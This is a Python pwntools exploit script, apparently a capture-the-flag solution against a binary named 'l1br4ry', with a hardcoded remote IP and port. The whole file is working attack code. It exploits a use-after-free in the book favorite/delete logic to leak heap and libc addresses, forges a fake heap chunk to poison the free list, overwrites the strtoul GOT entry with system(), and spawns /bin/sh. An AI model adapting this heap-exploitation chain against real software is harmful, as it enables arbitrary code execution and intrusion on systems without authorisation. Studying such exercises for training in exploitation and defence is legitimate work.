#!/usr/bin/env python2

from pwn import *

context(arch="amd64", os="linux")

p = None
strtoul_got_addr = 0x602070

remote = False
if remote:
    p = remote('130.211.206.204', 1340)
    system_offset = 0x41490
    strtoul_offset = 0x38f40
else:
    p = process('./l1br4ry')
    strtoul_offset = 0x3d410
    system_offset = 0x46590

# gdb.attach(p, '''
# set $num_books = 0x6020C0
# set $book_array = 0x6020B8
# ''')

def add_book(title, description, rating):
    p.sendline('a')
    p.sendline(title)
    p.sendline(str(rating))
    p.sendline(description)

def favorite_book(index):
    p.sendline(str(index))
    p.sendline('f')

def delete_book(index):
    p.sendline(str(index))
    p.sendline('d')

def edit_title(index, title, description, rating):
    p.sendline(str(index))
    p.sendline('e')
    p.sendline(title)
    p.sendline(str(rating))
    p.sendline(description)

def main():
    add_book('0', '0', 10)
    add_book('1', '1', 10)
    favorite_book(0)
    delete_book(2)

    delete_book(1)

    p.recvuntil('Your favorite: ')
    p.recvuntil('Your favorite: ')
    p.recvuntil('Your favorite: ')
    heap_leak = u64(p.recvline().strip().ljust(8, '\x00'))
    log.info('heap_leak: %s' % hex(heap_leak))
    log.info('chunk_addr: %s' % hex(heap_leak+0x50))

    # Allocate 7 books, setting the size of the books_array to 56
    for i in range(7):
        add_book(str(i), str(i), 10)

    delete_book(1)

    # Free list now has one chunk, books_array has size 48
    # Create fake chunk by setting correct metadata size
    edit_title(2, p64(0x51), 'AAAAAAAA', 10)

    # We add the fake chunk to the free list using the UAF
    edit_title(0, p64(heap_leak + 0x58), 'BBBBBBBB', 10)

    # Increase books array size to 56
    add_book('junk', 'junk', 10)
    add_book('junk2', 'junk2', 10)

    edit_title(2, p64(0x51), p64(strtoul_got_addr), 0)

    p.recvuntil('Editing title: Q')
    p.recvuntil('4: ')
    libc_leak = u64(p.recvline().strip().ljust(8, '\x00'))
    log.info('libc_leak: %s' % hex(libc_leak))

    libc_base = libc_leak - strtoul_offset
    system_addr = libc_base + system_offset

    log.info('libc_base: %s' % hex(libc_base))
    log.info('system_addr: %s' % hex(system_addr))

    edit_title(4, p64(system_addr), '', '/bin/sh')

    p.interactive()

if __name__ == '__main__':
    main()
